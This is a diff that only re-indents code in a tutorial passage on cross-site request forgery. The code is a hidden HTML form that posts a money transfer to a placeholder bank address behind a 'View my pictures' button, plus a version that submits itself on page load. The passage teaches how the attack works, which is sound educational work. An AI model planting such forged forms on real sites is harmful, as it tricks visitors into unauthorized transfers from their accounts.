@@ -83,9 +83,9 @@ acct=PERPRETOR&amount=100
 Such a request cannot be delivered using standard **A** or **IMG** tags, but can be delivered using a **FORM** tag: 
 ```html
 <form action="<nowiki>http://bank.com/transfer.do</nowiki>" method="POST">
-<input type="hidden" name="acct" value="WEBVISITOR"/>
-<input type="hidden" name="amount" value="100000"/>
-<input type="submit" value="View my pictures"/>
+  <input type="hidden" name="acct" value="WEBVISITOR"/>
+  <input type="hidden" name="amount" value="100000"/>
+  <input type="submit" value="View my pictures"/>
 </form>
 ```
 This form will require the user to click on the submit button, but this can be also executed automatically using **JavaScript**: 
@@ -93,9 +93,9 @@ This form will require the user to click on the submit button, but this can be a
 <body onload="document.forms[0].submit()">
 /*Here is the prior malicious code*/
 <form action="<nowiki>http://bank.com/transfer.do</nowiki>" method="POST">
-<input type="hidden" name="acct" value="WEBVISITOR"/>
-<input type="hidden" name="amount" value="100000"/>
-<input type="submit" value="View my pictures"/>
+  <input type="hidden" name="acct" value="WEBVISITOR"/>
+  <input type="hidden" name="amount" value="100000"/>
+  <input type="submit" value="View my pictures"/>
 </form>
 ```
 ## Presence detection
